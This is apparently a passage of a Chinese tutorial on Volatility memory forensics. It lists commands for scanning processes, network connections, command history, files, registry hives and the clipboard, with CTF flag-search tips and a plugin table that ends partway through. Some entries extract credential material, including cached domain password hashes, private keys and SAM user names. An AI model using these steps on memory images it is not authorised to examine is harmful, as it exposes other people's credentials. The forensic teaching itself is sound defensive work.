&lt;p&gt;&lt;strong&gt;6.隐藏或解链的进程	psscan&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 psscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7.查看服务，查询服务名称	svcscan&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 svcscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;svcscan：扫描 Windows 的服务&lt;/p&gt;
&lt;p&gt;8.查看浏览器历史记录,获取当前系统浏览器搜索过的关键词	 iehistory&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 iehistory&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;9.查看网络连接 获取当前系统 ip netscan &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 netscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)&lt;/p&gt;
&lt;p&gt;volatility -f win7.vmem –profile&amp;#x3D;Win7SPIx64 netscan |grep ESTABLISHED  查看网络通信连接&lt;/p&gt;
&lt;p&gt;10.查看网络连接connscan&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 connscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;connscan：查看网络连接&lt;/p&gt;
&lt;p&gt;11.查看网络连接connections&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 connections&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;connections：查看网络连接&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;12.查看命令行操作，显示cmd历史命令 cmdscan&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 cmdscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;cmdscan：可用于查看终端记录&lt;/p&gt;
&lt;p&gt;13.查看进程命令行参数（具体一些可疑进程的参数指令）cmdline&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 cmdline&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;14.扫描所有的文件列表 filescan&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 filescan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;（linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’）&lt;/p&gt;
&lt;p&gt;例&lt;/p&gt;
&lt;p&gt;volatility -f 1.vmem –profile&amp;#x3D;Win7SP1x64 filescan grep “flag.txt”&lt;/p&gt;
&lt;p&gt;cat system.txt|grep -i computername&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;15.查看文件内容dmpfiles&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;需要指定偏移量 -Q 和输出目录 -D&lt;/p&gt;
&lt;p&gt;dumpfiles：导出某一文件(指定虚拟地址)&lt;/p&gt;
&lt;p&gt;16.查看当前展示的notepad内容 notepad&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 notepad&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;查看当前展示的 notepad 文本（–profile&amp;#x3D;winxp啥的低版本可以，win7的不行，可以尝试使用editbox）&lt;/p&gt;
&lt;p&gt;17.显示有关编辑控件（曾经编辑过的内容）的信息 editbox&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 editbox&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;editbox：显示有关编辑控件（曾经编辑过的内容）的信息 查看内存中记事本的内容&lt;/p&gt;
&lt;p&gt;18.提取进程memdump&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;memdump：提取出指定进程，常用foremost 来分离里面的文件  &lt;/p&gt;
&lt;p&gt;需要指定进程-p [pid] 和输出目录 -D&lt;/p&gt;
&lt;p&gt;memdump -p 332 -D XX&amp;#x2F;   &lt;/p&gt;
&lt;p&gt;提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）&lt;/p&gt;
&lt;p&gt;dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐&lt;/p&gt;
&lt;p&gt;strings -e l 2040.dmp | grep flag 查找flag&lt;/p&gt;
&lt;p&gt;19.屏幕截图screenshot&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;screenshot：保存基于GDI窗口的伪截屏&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;20.查看注册表配置单元hivelist&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 hivelist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;hivelist: 列出所有的注册表项及其虚拟地址和物理地址&lt;/p&gt;
&lt;p&gt;21.查看注册表键名hivedmp&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;22.查看注册表键值printkey&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &amp;quot;ControlSet001\Control\ComputerName\ComputerName&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;23.获取主机名 printkey&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &amp;quot;ControlSet001\Control\ComputerName\ComputerName&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;24.列出用户名 pringkey&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &amp;quot;SAM\Domains\Account\Users\Names&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;25.查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。userassist&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 userassist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;26.最大程序提取信息timeliner&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 timeliner&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;timeliner: 将所有操作系统事件以时间线的方式展开&lt;/p&gt;
&lt;p&gt;27.查看剪贴板信息clipboard&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 clipboard&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;clipboard：查看剪贴板信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;28.显示关于计算机及其操作系统的详细配置信息（插件）systeminfo&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 systeminfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;systeminfo：显示关于计算机及其操作系统的详细配置信息（插件）&lt;/p&gt;
&lt;p&gt;29.恢复被删除的文件mftparser&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 mftparser&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;mftparser：恢复被删除的文件&lt;/p&gt;
&lt;p&gt;30.查看环境变量envars&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 envars&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;envars：查看环境变量&lt;/p&gt;
&lt;p&gt;31.列出某一进程加载的所有dll文件dlllist&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;dlllist: 列出某一进程加载的所有dll文件&lt;/p&gt;
&lt;p&gt;需要指定进程-p [pid]&lt;/p&gt;
&lt;p&gt;32.程序版本信息 verinfo&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 verinfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;列出PE｜程序版本信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;33.产看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在进程中PPID比PID还大，那就可能这个进程有异常程序&lt;/p&gt;
&lt;p&gt;34.从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;35.提取注册表数据	dumpregistry&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 2008.raw –profile=Win2008R2SP1x64 dumpregistry&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;插件名称&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;功能&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;amcache&lt;/td&gt;
&lt;td&gt;查看AmCache应用程序痕迹信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;apihooks&lt;/td&gt;
&lt;td&gt;检测内核及进程的内存空间中的API hook&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;atoms&lt;/td&gt;
&lt;td&gt;列出会话及窗口站atom表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;atomscan&lt;/td&gt;
&lt;td&gt;Atom表的池扫描(Pool scanner)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;auditpol&lt;/td&gt;
&lt;td&gt;列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bigpools&lt;/td&gt;
&lt;td&gt;使用BigPagePoolScanner转储大分页池(big page pools)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bioskbd&lt;/td&gt;
&lt;td&gt;从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cachedump&lt;/td&gt;
&lt;td&gt;获取内存中缓存的域帐号的密码哈希&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;callbacks&lt;/td&gt;
&lt;td&gt;打印全系统通知例程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;clipboard&lt;/td&gt;
&lt;td&gt;提取Windows剪贴板中的内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cmdline&lt;/td&gt;
&lt;td&gt;显示进程命令行参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cmdscan&lt;/td&gt;
&lt;td&gt;提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;connections&lt;/td&gt;
&lt;td&gt;打印系统打开的网络连接(仅支持Windows XP 和2003)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;connscan&lt;/td&gt;
&lt;td&gt;打印TCP连接信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;consoles&lt;/td&gt;
&lt;td&gt;提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;crashinfo&lt;/td&gt;
&lt;td&gt;提取崩溃转储信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;deskscan&lt;/td&gt;
&lt;td&gt;tagDESKTOP池扫描(Poolscaner)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;devicetree&lt;/td&gt;
&lt;td&gt;显示设备树信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dlldump&lt;/td&gt;
&lt;td&gt;从进程地址空间转储动态链接库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dlllist&lt;/td&gt;
&lt;td&gt;打印每个进程加载的动态链接库列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;driverirp&lt;/td&gt;
&lt;td&gt;IRP hook驱动检测&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;drivermodule&lt;/td&gt;
&lt;td&gt;关联驱动对象至内核模块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;driverscan&lt;/td&gt;
&lt;td&gt;驱动对象池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dumpcerts&lt;/td&gt;
&lt;td&gt;提取RAS私钥及SSL公钥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dumpfiles&lt;/td&gt;
&lt;td&gt;提取内存中映射或缓存的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dumpregistry&lt;/td&gt;
&lt;td&gt;转储内存中注册表信息至磁盘&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;editbox&lt;/td&gt;
&lt;td&gt;查看Edit编辑控件信息 (Listbox正在实验中)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;envars&lt;/td&gt;
&lt;td&gt;显示进程的环境变量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventhooks&lt;/td&gt;
&lt;td&gt;打印Windows事件hook详细信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;evtlogs&lt;/td&gt;
&lt;td&gt;提取Windows事件日志（仅支持XP&amp;#x2F;2003)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;filescan&lt;/td&gt;
&lt;td&gt;提取文件对象（file objects）池信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;gahti&lt;/td&gt;
&lt;td&gt;转储用户句柄（handle）类型信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;gditimers&lt;/td&gt;
&lt;td&gt;打印已安装的GDI计时器(timers)及回调(callbacks)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;gdt&lt;/td&gt;
&lt;td&gt;显示全局描述符表(Global Deor Table)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;getservicesids&lt;/td&gt;
&lt;td&gt;获取注册表中的服务名称并返回SID信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;getsids&lt;/td&gt;
&lt;td&gt;打印每个进程的SID信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;handles&lt;/td&gt;
&lt;td&gt;打印每个进程打开的句柄的列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hashdump&lt;/td&gt;
